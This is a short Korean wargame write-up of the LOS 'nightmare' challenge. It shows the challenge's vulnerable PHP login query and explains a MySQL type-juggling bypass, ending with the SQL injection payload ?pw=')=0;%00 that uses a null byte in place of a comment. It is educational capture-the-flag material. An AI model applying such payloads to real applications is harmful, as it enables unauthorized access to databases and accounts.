---
title : "LOS Lv.18 nightmare (답지 봄)"
categories : [Wargame, rubiya]
tags : [type juggling, 풀이 봄]
---


## nightmare
<hr style="border-top: 1px solid;"><br>

```php
query : select id from prob_nightmare where pw=('') and id!='admin'

<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

주석 처리는 ```;%00```으로 대체 가능함.

자동형변환(type juggling)을 이용할 것임.

```pw=('')=0```이 되면 mysql의 ```'='```은 비교연산자이기 때문에 ```pw=('')``` 부분에서 ```false```이므로 0이 리턴이 되기 때문에 ```0=0```이 되므로 true가 됨. 

Payload
: ```?pw=')=0;%00```

<br><br>
<hr style="border: 2px solid;">
<br><br>
